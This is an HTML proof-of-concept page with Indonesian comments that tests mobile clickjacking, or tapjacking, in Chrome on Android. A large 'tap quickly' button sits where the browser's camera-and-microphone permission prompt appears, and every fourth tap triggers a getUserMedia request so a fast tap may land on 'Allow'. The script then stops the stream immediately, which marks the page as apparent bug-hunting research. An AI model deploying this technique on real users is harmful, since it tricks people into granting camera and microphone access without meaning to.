<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobile Clickjacking Test</title>
    <style>
        body { 
            margin: 0; padding: 0; background: #111; color: white; 
            font-family: sans-serif; overflow: hidden; touch-action: none; 
        }
        /* Tombol target yang posisinya kita samakan dengan tombol 'Allow' Chrome */
        #target-button {
            position: absolute;
            bottom: 30%; /* Area umum prompt Chrome Android */
            left: 50%;
            transform: translateX(-50%);
            width: 85vw;
            height: 120px;
            background: linear-gradient(45deg, #ff0000, #990000);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
            box-shadow: 0 0 20px rgba(255,0,0,0.5);
            z-index: 10;
        }
        #score-board { margin: 20px; font-size: 18px; color: #55ff55; }
    </style>
</head>
<body>

    <div id="score-board">Taps Detected: <span id="score">0</span></div>
    <div id="target-button">TAP CEPAT DI SINI!</div>
    
    <div id="status" style="position:fixed; top:20px; width:100%; text-align:center; font-family:monospace;"></div>

    <script>
        let score = 0;
        const btn = document.getElementById('target-button');
        const scoreDisplay = document.getElementById('score');
        const status = document.getElementById('status');

        // Pakai touchstart untuk respons instan di HP
        btn.addEventListener('touchstart', (e) => {
            e.preventDefault(); 
            score++;
            scoreDisplay.innerText = score;

            // Trigger prompt setiap 4 kali tap
            if (score % 4 === 0) {
                requestPermission();
            }
        });

        async function requestPermission() {
            status.innerText = "TRIGGERING PROMPT...";
            try {
                // Minta video & audio untuk memperbesar ukuran prompt sistem
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // Jika baris di bawah ini muncul, berarti jari lo "tembus" ke tombol Allow
                status.innerHTML = "<h2 style='color:red;'>BUG DETECTED: PERMISSION BYPASS!</h2>";
                
                // Stop kamera langsung setelah sukses
                stream.getTracks().forEach(track => track.stop());
            } catch (err) {
                status.innerText = "Status: " + err.name;
            }
        }
    </script>
</body>
</html>
